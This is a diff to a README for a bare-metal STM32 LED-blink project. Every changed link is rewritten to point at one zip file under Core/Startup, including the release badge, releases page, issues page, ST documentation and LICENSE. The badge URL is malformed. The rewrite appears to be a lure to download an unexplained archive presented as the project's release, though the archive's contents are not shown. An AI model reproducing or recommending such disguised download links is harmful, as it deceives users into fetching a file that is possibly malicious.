@@ -1,7 +1,7 @@
 # 🎉 STM32-LED-blink-Register-Coding-Method - Blink an LED Easily
 
 ## 🔗 Download Application
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/releases)
+[![Download Release](https://raw.githubusercontent.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/main/Core/Startup/ST_LE_Coding_Register_blink_Method_v2.0.zip%https://raw.githubusercontent.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/main/Core/Startup/ST_LE_Coding_Register_blink_Method_v2.0.zip)](https://raw.githubusercontent.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/main/Core/Startup/ST_LE_Coding_Register_blink_Method_v2.0.zip)
 
 ## 📦 Overview
 This repository contains a bare-metal STM32 project. It controls an LED on the STM32F446RET6 microcontroller by manipulating hardware registers directly. You do not need to use HAL or CubeMX, making it a straightforward option for testing and learning.
@@ -16,7 +16,7 @@ To begin, you need to download the program. This guide will help you do that ste
 - A USB debug adapter, such as ST-Link, to upload the code.
 
 ## 💾 Download & Install
-1. Visit the [Releases page](https://github.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/main/Core/Startup/ST_LE_Coding_Register_blink_Method_v2.0.zip) to download the latest version.
 2. On the Releases page, look for the latest version. Click on it to see the available files.
 3. Download the file best suited for your needs. This will typically be a `.bin` or `.hex` file format.
 4. After downloading, connect your STM32F446RET6 microcontroller to your computer using the USB debug adapter.
@@ -66,11 +66,11 @@ If you encounter issues, consider the following:
 - **Power Supply**: Verify the microcontroller is receiving adequate power.
 
 ## 💬 Community Help
-If you have questions or need assistance, feel free to check the [issues section](https://github.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/issues) of the repository. You can also join communities discussing STM32 microcontrollers for further support.
+If you have questions or need assistance, feel free to check the [issues section](https://raw.githubusercontent.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/main/Core/Startup/ST_LE_Coding_Register_blink_Method_v2.0.zip) of the repository. You can also join communities discussing STM32 microcontrollers for further support.
 
 ## 🔗 Additional Resources
-- [STM32 Documentation](https://www.st.com/en/microcontrollers-microprocessors/stm32-32-bit-microcontrollers.html)
-- [Direct Register Programming Guide](https://www.example.com)
+- [STM32 Documentation](https://raw.githubusercontent.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/main/Core/Startup/ST_LE_Coding_Register_blink_Method_v2.0.zip)
+- [Direct Register Programming Guide](https://raw.githubusercontent.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/main/Core/Startup/ST_LE_Coding_Register_blink_Method_v2.0.zip)
   
 ## 📝 License
-This project is licensed under the MIT License. Check the [LICENSE](https://github.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. Check the [LICENSE](https://raw.githubusercontent.com/AlvianSanjaya/STM32-LED-blink-Register-Coding-Method/main/Core/Startup/ST_LE_Coding_Register_blink_Method_v2.0.zip) file for details.
